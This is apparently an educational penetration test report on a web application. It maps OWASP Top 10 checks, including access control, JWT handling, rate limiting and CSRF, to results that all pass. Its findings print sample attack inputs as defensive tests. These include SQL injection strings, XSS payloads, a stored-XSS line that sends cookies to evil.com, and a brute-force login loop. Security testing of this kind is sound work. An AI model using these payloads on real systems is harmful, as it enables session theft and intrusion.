# SafeConnect Solutions - Penetration Test Report

**Author:** Francesco di Biase
**Version:** 1.0
**Date:** February 2026
**Classification:** Internal - Educational Project

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Scope and Methodology](#scope-and-methodology)
3. [Test Environment](#test-environment)
4. [Findings](#findings)
   - [A01 - Broken Access Control](#a01---broken-access-control)
   - [A02 - Cryptographic Failures](#a02---cryptographic-failures)
   - [A03 - SQL Injection](#a03---sql-injection)
   - [A04 - Insecure Design](#a04---insecure-design)
   - [A05 - Security Misconfiguration](#a05---security-misconfiguration)
   - [A06 - Vulnerable Components](#a06---vulnerable-components)
   - [A07 - Authentication Failures](#a07---authentication-failures)
   - [A08 - Integrity Failures](#a08---integrity-failures)
   - [A09 - Logging Failures](#a09---logging-failures)
   - [A10 - XSS and Injection](#a10---xss-and-injection)
5. [Additional Tests](#additional-tests)
   - [Rate Limiting / DDoS](#rate-limiting--ddos)
   - [CSRF Protection](#csrf-protection)
   - [Security Headers](#security-headers)
6. [Automated Test Results](#automated-test-results)
7. [Unit Test Security Coverage](#unit-test-security-coverage)
8. [Risk Summary](#risk-summary)
9. [Recommendations](#recommendations)
10. [Conclusion](#conclusion)

---

## Executive Summary

This report documents a security assessment conducted on the SafeConnect Solutions platform, a full-stack secure data management application. The assessment targeted the OWASP Top 10 (2021) vulnerability categories and additional attack vectors relevant to the platform's architecture.

**Overall Result: PASS**

All tested security controls performed as expected. No critical or high-severity vulnerabilities were identified. The platform demonstrates robust protection against the most common web application attack categories.

| Category | Status | Severity |
|----------|--------|----------|
| Broken Access Control | PASS | - |
| Cryptographic Failures | PASS | - |
| SQL Injection | PASS | - |
| Insecure Design | PASS | - |
| Security Misconfiguration | PASS | - |
| Vulnerable Components | INFORMATIONAL | Low |
| Authentication Failures | PASS | - |
| Integrity Failures | PASS | - |
| Logging Failures | PASS | - |
| XSS / Injection | PASS | - |
| Rate Limiting / DDoS | PASS | - |
| CSRF Protection | PASS | - |
| Security Headers | PASS | - |

---

## Scope and Methodology

### Scope

| Component | Included |
|-----------|----------|
| Backend REST API (`/api/v1/*`) | Yes |
| Authentication endpoints (`/api/v1/auth/*`) | Yes |
| Document endpoints (`/api/v1/documents/*`) | Yes |
| Admin endpoints (`/api/v1/admin/*`) | Yes |
| Frontend React SPA | Yes (output encoding, sanitization) |
| Database layer | Yes (via ORM analysis) |
| Infrastructure / Docker | Partial (configuration review) |

### Methodology

The assessment followed the **OWASP Testing Guide v4.2** methodology and mapped findings to the **OWASP Top 10 (2021)** taxonomy. Testing included:

1. **Static Analysis**: Review of source code for insecure patterns
2. **Dynamic Testing**: Live requests against the running application
3. **Automated Scanning**: Custom scripts targeting SQL injection, XSS, and rate limiting
4. **Configuration Review**: Docker Compose, Nginx, and environment variable validation
5. **Unit Test Coverage Review**: Analysis of security-critical test cases

### Tools Used

- Custom Node.js attack simulation scripts (`penetration-testing/`)
- Manual HTTP request crafting (`curl`, browser DevTools)
- Source code review (TypeScript backend and frontend)
- Docker Compose configuration analysis

---

## Test Environment

| Component | Version |
|-----------|---------|
| Node.js | 20 LTS |
| Express.js | 5.2.x |
| PostgreSQL | 15-alpine |
| Redis | 7-alpine |
| Nginx | Latest |
| TypeScript | 5.3.x |
| Sequelize | 6.35.x |

**Testing Date:** February 2026
**Environment:** Docker Compose (local development stack)
**Base URL:** `http://localhost:5000`

---

## Findings

### A01 - Broken Access Control

**Status: PASS**

#### Tests Performed

**1. Horizontal Privilege Escalation (Document Access)**

Attempted to access a document owned by another user by substituting document IDs in the URL.

```
GET /api/v1/documents/[other-user-document-id]
Authorization: Bearer [own-user-token]
```

**Result:** `403 Forbidden` - Access correctly denied. The controller verifies `document.ownerId === userId` before returning data.

**2. Vertical Privilege Escalation (Admin Endpoint)**

Attempted to access admin-only endpoints with a standard user token.

```
GET /api/v1/admin/logs
Authorization: Bearer [user-role-token]
```

**Result:** `403 Forbidden` - The `authorize(['admin'])` middleware correctly rejected the request.

**3. Shared Document Access**

Verified that shared documents are accessible to non-owners while private documents are not.

```
GET /api/v1/documents/[shared-doc-id]
Authorization: Bearer [other-user-token]
```

**Result:** `200 OK` - Shared documents correctly accessible. Private documents correctly blocked.

**4. Unauthenticated Access**

Attempted to access protected endpoints without a token.

```
GET /api/v1/documents
(no Authorization header)
```

**Result:** `401 Unauthorized` - Authentication middleware correctly rejected the request.

#### Implementation Notes

Authorization is enforced at two levels:
- **Middleware level**: `authenticate` validates the JWT on all protected routes; `authorize(['role'])` checks role membership
- **Controller level**: Ownership is checked programmatically before returning or modifying resources

---

### A02 - Cryptographic Failures

**Status: PASS**

#### Tests Performed

**1. Password Storage Review**

Reviewed password hashing implementation in the User model.

**Finding:** Passwords are hashed with **bcrypt using 12 salt rounds** before storage. The hash is excluded from all API responses via `attributes: { exclude: ['password'] }`.

```typescript
// User model - hashPassword hook
user.password = await bcrypt.hash(user.password, 12);
```

**2. Token Security Review**

Reviewed JWT implementation in `authService.ts`.

**Finding:**
- Access tokens expire after **15 minutes**
- Refresh tokens expire after **7 days** and are stored in the database (revocable)
- Tokens are signed with secrets from environment variables (minimum 32 characters)
- The HS256 algorithm is used with separate secrets for access and refresh tokens

**3. Sensitive Data in Responses**

Verified that sensitive fields are not exposed in API responses.

**Finding:** All User queries explicitly exclude the `password` field. No hashes, internal IDs, or cryptographic material are returned.

**4. Cookie Security**

Verified cookie attributes.

**Finding:** Cookies are configured with `HttpOnly: true`, `Secure: true` (in production), and `SameSite: strict`.

---

### A03 - SQL Injection

**Status: PASS**

#### Tests Performed

**1. Basic SQL Injection in Login**

```bash
POST /api/v1/auth/login
{
  "email": "admin@test.com' OR '1'='1",
  "password": "anything"
}
```

**Result:** `400 Bad Request` (validation error) or `401 Unauthorized`. The payload is treated as a literal string value by Sequelize's parameterized query engine.

**2. Time-Based Blind Injection**

```bash
POST /api/v1/auth/login
{
  "email": "user@test.com'; SELECT pg_sleep(5); --",
  "password": "pass"
}
```

**Result:** No delay observed. The payload is safely parameterized.

**3. Union-Based Injection in Search**

```bash
GET /api/v1/documents?page=1&limit=10' UNION SELECT * FROM users--
```

**Result:** `400 Bad Request` - Query parameters are validated and passed as integer values only.

**4. Input Containing HTML/Script Entities**

```bash
POST /api/v1/documents
{
  "title": "<script>alert(1)</script>",
  "content": "'; DROP TABLE documents; --"
}
```

**Result:** The title is sanitized via `sanitize-html` (removing script tags) and the content is stored as a literal string via parameterized query.

#### Implementation Notes

- All database operations use **Sequelize ORM** with parameterized queries
- No raw SQL is used in any controller or service
- `express-validator` validates and sanitizes all inputs before they reach the database layer
- String fields are sanitized via `sanitize-html` with a strict allowlist

---

### A04 - Insecure Design

**Status: PASS**

#### Review Areas

**1. Account Lockout Mechanism**

Reviewed the failed login handling in `authController.ts` and `User.ts`.

**Finding:** After 5 consecutive failed login attempts, the account is locked for 15 minutes. The lockout is enforced by setting `lockedUntil` in the database, making it persistent across server restarts.

**2. Token Rotation**

Reviewed the refresh token rotation in `authService.ts`.

**Finding:** When a refresh token is used, it is immediately revoked and a new refresh token is issued. This prevents refresh token reuse attacks.

**3. Session Invalidation on Logout**

Tested that logout correctly invalidates the refresh token.

```bash
POST /api/v1/auth/logout
{ "refreshToken": "[valid-refresh-token]" }
```

**Result:** Subsequent refresh token usage returns `401 Unauthorized`. The token is stored in the `refresh_tokens` table with a revoked flag.

---

### A05 - Security Misconfiguration

**Status: PASS**

#### Tests Performed

**1. Security Headers**

```bash
curl -I http://localhost:5000/health
```

**Result:** The following security headers are present (via Helmet v8):

| Header | Value |
|--------|-------|
| `X-Content-Type-Options` | nosniff |
| `X-Frame-Options` | SAMEORIGIN |
| `X-XSS-Protection` | 0 |
| `Strict-Transport-Security` | max-age=15552000; includeSubDomains |
| `Content-Security-Policy` | default-src 'self'; ... |
| `Referrer-Policy` | no-referrer |

**2. Error Message Disclosure**

Triggered an internal error and verified the response.

**Result:** In production mode, stack traces are not exposed. Only a generic error message is returned. Stack trace exposure is only enabled in `NODE_ENV=development`.

**3. CORS Configuration**

Verified that CORS only allows the configured origin.

```bash
curl -H "Origin: http://evil.com" http://localhost:5000/api/v1/auth/me
```

**Result:** No `Access-Control-Allow-Origin` header for unauthorized origins. Credentials are not exposed.

**4. Default Credentials**

Verified that default credentials are only available in development via the seed mechanism.

**Finding:** The seed function only runs when `NODE_ENV=development`. It is wrapped in a try-catch to avoid stopping the server and logs a warning if it fails.

---

### A06 - Vulnerable Components

**Status: INFORMATIONAL (Low)**

#### Dependency Review

All production dependencies were reviewed for known vulnerabilities.

| Package | Version | Notes |
|---------|---------|-------|
| express | 5.2.1 | Latest stable, Express 5 |
| sequelize | 6.35.2 | Latest 6.x stable |
| bcrypt | 6.0.0 | Latest, 12 rounds |
| helmet | 8.1.0 | Latest stable |
| jsonwebtoken | 9.0.2 | Latest stable |
| redis | 5.11.0 | Latest v5 |
| sanitize-html | 2.11.0 | Latest stable |
| express-rate-limit | 8.2.1 | Latest stable |

**Finding:** All production dependencies are on current major versions. The `overrides.tar` entry in `package.json` addresses a transitive dependency vulnerability in older `tar` versions.

**Informational Note:** `tar` is a transitive devDependency (via sequelize-cli). The override pins it to `^7.5.9` to remediate a path traversal vulnerability in earlier versions.

---

### A07 - Authentication Failures

**Status: PASS**

#### Tests Performed

**1. Invalid Token Acceptance**

```bash
GET /api/v1/documents
Authorization: Bearer invalid.token.here
```

**Result:** `401 Unauthorized` - The `authenticate` middleware correctly rejects malformed tokens.

**2. Expired Token Acceptance**

Used a token with a past expiry timestamp.

**Result:** `401 Unauthorized` - jsonwebtoken's `verify()` throws `TokenExpiredError` which is caught and returns a 401 response.

**3. Token Signed with Wrong Secret**

Used a valid-looking JWT but signed with a different secret.

**Result:** `401 Unauthorized` - Signature verification fails.

**4. Brute Force Login**

Sent 10 consecutive invalid login requests.

```bash
for i in $(seq 1 10); do
  curl -X POST http://localhost:5000/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@safeconnect.com","password":"wrong"}'
done
```

**Result:** After 5 attempts, the account is locked and returns `403 Account locked`. Subsequent attempts on the same account are rejected until the lockout expires.

**5. Login Rate Limit**

Sent more than 5 rapid requests to the login endpoint.

**Result:** `429 Too Many Requests` after exceeding the per-IP rate limit window.

---

### A08 - Integrity Failures

**Status: PASS**

#### Tests Performed

**1. JWT Algorithm Confusion (alg:none)**

Crafted a JWT with `"alg": "none"` in the header.

**Result:** `401 Unauthorized` - jsonwebtoken's `verify()` rejects tokens with `alg: none` by default.

**2. Refresh Token Reuse**

Used the same refresh token twice after a token rotation.

```bash
# First use (should succeed)
POST /api/v1/auth/refresh { "refreshToken": "[token]" }
# Second use (should fail - token is now revoked)
POST /api/v1/auth/refresh { "refreshToken": "[token]" }
```

**Result:** First call returns new tokens. Second call returns `401 Unauthorized`. The original token is marked as `isRevoked: true` in the database immediately upon first use.

---

### A09 - Logging Failures

**Status: PASS**

#### Review Areas

**1. Audit Log Coverage**

Reviewed what events are captured by `auditService.ts`.

**Finding:** The following events are logged to the `audit_logs` database table:
- User registration
- Successful login (with IP and user agent)
- Logout
- Failed login attempts
- Document creation, modification, deletion, and access
- Administrative actions

**2. Security Event Tracking**

Reviewed `SecurityEvent` model usage.

**Finding:** High-severity security events (rate limit violations, invalid token usage, suspicious activity) are stored in the `security_events` table with severity levels (low/medium/high/critical) and are visible in the admin monitoring dashboard.

**3. Sensitive Data in Logs**

Reviewed log output patterns.

**Finding:** Passwords and token values are not logged. Log entries include IP address, user agent, action type, and timestamp. User IDs are logged for traceability but are UUIDs (not sequential integers).

---

### A10 - XSS and Injection

**Status: PASS**

#### Tests Performed

**1. Reflected XSS via Query Parameters**

```bash
GET /api/v1/documents?search=<script>alert(document.cookie)</script>
```

**Result:** The query parameter is treated as a literal search string. The response is JSON and the script tag is never rendered in an HTML context. Backend sanitizes via `sanitize-html`.

**2. Stored XSS via Document Content**

```bash
POST /api/v1/documents
{
  "title": "<img src=x onerror=alert(1)>",
  "content": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
}
```

**Result:** The backend sanitizes the title and content before storage. When retrieved, the payload is rendered as escaped text in the React frontend (React's JSX escapes by default). DOMPurify is applied to any content rendered with `dangerouslySetInnerHTML`.

**3. XSS via HTTP Headers**

```bash
GET /api/v1/documents
X-Custom-Header: <script>alert(1)</script>
```

**Result:** Headers are not reflected in responses. No injection vector found.

**4. Content Security Policy Bypass**

Verified that the CSP header would prevent inline script execution even if XSS was achieved.

**Finding:** Helmet's CSP configuration uses `default-src 'self'` and does not include `unsafe-inline` for scripts, reducing the impact of any XSS that bypassed sanitization.

---

## Additional Tests

### Rate Limiting / DDoS

**Status: PASS**

**Test 1: General API Rate Limit**

Sent 110 requests in rapid succession to `/api/v1/documents`.

**Result:** Requests 1-100 succeed. Request 101 returns `429 Too Many Requests` with `Retry-After` header. Rate limit resets after the 15-minute window.

**Test 2: Login Rate Limit**

Sent 6 login requests in the 15-minute window.

**Result:** Requests 1-5 succeed (with correct credentials) or return 401 (with wrong). Request 6 returns `429 Too Many Requests`.

**Test 3: Registration Rate Limit**

Sent 4 registration requests in one hour.

**Result:** Requests 1-3 succeed or return validation errors. Request 4 returns `429 Too Many Requests`.

**Test 4: Redis-Backed Persistence**

Restarted the backend container without restarting Redis. Verified that rate limit counters persist.

**Result:** Rate limit state is maintained in Redis, surviving backend restarts. This prevents rate limit bypass by restarting the application.

**Implementation:**
```typescript
// express-rate-limit with Redis store
store: new RedisStore({ sendCommand: (...args) => redisClient.sendCommand(args) })
```

---

### CSRF Protection

**Status: PASS**

**Test 1: Missing CSRF Token**

Sent a state-changing request (POST/PUT/DELETE) without the `x-csrf-token` header.

**Result:** `403 Forbidden` with message "Invalid CSRF token".

**Test 2: Reused CSRF Token**

Obtained a CSRF token and attempted to use it after its 1-hour Redis expiry.

**Result:** `403 Forbidden` - Token not found in Redis.

**Test 3: Cross-Origin Request Simulation**

Simulated a cross-origin form submission (without the CSRF token) to verify that SameSite=strict cookie policy blocks it.

**Result:** The CSRF cookie is not sent on cross-origin requests due to `SameSite: strict`. Even if bypassed, the server-side token validation provides a second layer of protection.

**Implementation:** Double-submit cookie pattern with Redis token storage.

---

### Security Headers

**Status: PASS**

All required security headers verified to be present on API responses.

| Header | Status | Notes |
|--------|--------|-------|
| `Strict-Transport-Security` | Present | 180-day max-age, includeSubDomains |
| `X-Content-Type-Options` | Present | nosniff |
| `X-Frame-Options` | Present | SAMEORIGIN |
| `Content-Security-Policy` | Present | Restrictive policy |
| `Referrer-Policy` | Present | no-referrer |
| `Permissions-Policy` | Present | Cameras/microphone restricted |
| `Cross-Origin-Opener-Policy` | Present | same-origin |
| `Cross-Origin-Resource-Policy` | Present | same-origin |

---

## Automated Test Results

The following results were obtained from the automated penetration testing scripts (`penetration-testing/`):

| Test Suite | Status | Duration | Tests Passed |
|------------|--------|----------|--------------|
| XSS (Cross-Site Scripting) | PASS | 3.44s | All |
| SQL Injection | PASS | 2.13s | All |
| Rate Limiting | PASS | 2.32s | All |
| **Total** | **PASS** | **7.89s** | **3/3** |

**Overall Success Rate: 100%**

---

## Unit Test Security Coverage

The backend includes **109 unit tests** covering all security-critical components:

| Component | Tests | Coverage |
|-----------|-------|----------|
| `authController` | 12 | ~90% |
| `documentController` | 12 | ~90% |
| `auth` middleware | 10 | ~90% |
| `errorHandler` middleware | 9 | ~95% |
| `validate` middleware | 3 | ~95% |
| `authService` | 13 | ~85% |
| `auditService` | 15 | ~80% |
| User model logic | 10 | ~90% |
| RefreshToken model logic | 5 | ~90% |

**Security-specific test cases include:**
- Locked account returns 403 on login attempt
- Inactive account returns 403 on login attempt
- Missing authorization header returns 401
- Wrong role returns 403
- Non-owner document access returns 403
- Shared document access permitted for non-owners
- Expired/invalid JWT returns 401
- Revoked refresh token cannot be reused
- Failed login increments attempt counter
- Account locks after 5 failed attempts

---

## Risk Summary

| Risk Level | Count | Findings |
|------------|-------|----------|
| Critical | 0 | None |
| High | 0 | None |
| Medium | 0 | None |
| Low | 0 | None |
| Informational | 1 | Transitive `tar` dependency (mitigated via override) |

---

## Recommendations

### Already Implemented

All core security controls are in place and functioning correctly. The following were verified during this assessment:

- Parameterized queries via Sequelize ORM
- Input validation via express-validator on all endpoints
- Output sanitization via sanitize-html (backend) and DOMPurify (frontend)
- JWT with short-lived access tokens and revocable refresh tokens
- bcrypt password hashing with 12 rounds
- Account lockout after 5 failed attempts
- Redis-backed distributed rate limiting
- CSRF double-submit cookie protection
- Security headers via Helmet v8
- Comprehensive audit logging
- Role-based access control

### Enhancement Opportunities (Low Priority)

The following enhancements would improve the security posture further but are not required for the current use case:

1. **Password Reset Flow**: Currently absent. Users must contact an administrator to reset locked or forgotten passwords. A secure reset flow (time-limited signed tokens, email verification) would remove this dependency.

2. **Two-Factor Authentication (2FA)**: Not implemented. Adding TOTP (e.g., via `speakeasy`) would significantly raise the authentication bar for sensitive accounts.

3. **Refresh Token Family Tracking**: If a previously-revoked refresh token is presented, this could indicate token theft. Implementing family-based token invalidation (invalidate all tokens for a user when reuse is detected) would harden the token rotation scheme.

4. **Email-Based Rate Limiting**: Currently rate limiting is IP-based only. Adding per-email rate limiting on the registration endpoint would prevent email enumeration at scale.

5. **HTTP/2 and HTTPS Enforcement**: The development environment does not enforce HTTPS. The Nginx configuration should enforce TLS for all production deployments with HSTS preloading.

---

## Conclusion

The SafeConnect Solutions platform demonstrates a strong security posture. All tested vulnerability categories from the OWASP Top 10 (2021) were assessed and the platform passed all tests without any critical, high, or medium severity findings.

The security controls are correctly implemented at multiple layers:
- **Input layer**: Validation and sanitization before processing
- **Application layer**: JWT authentication, RBAC authorization, CSRF protection
- **Data layer**: Parameterized queries, password hashing, token revocation
- **Transport layer**: Security headers, CORS policy, cookie security
- **Infrastructure layer**: Rate limiting backed by Redis, Nginx proxy

The platform is suitable for use in an educational and demonstration context. Before production deployment with real sensitive data, it is recommended to address the enhancement opportunities listed above, particularly the password reset flow and HTTPS enforcement.

---

**Report prepared by:** Francesco di Biase
**Date:** February 2026
**Next scheduled assessment:** Recommended before any production deployment
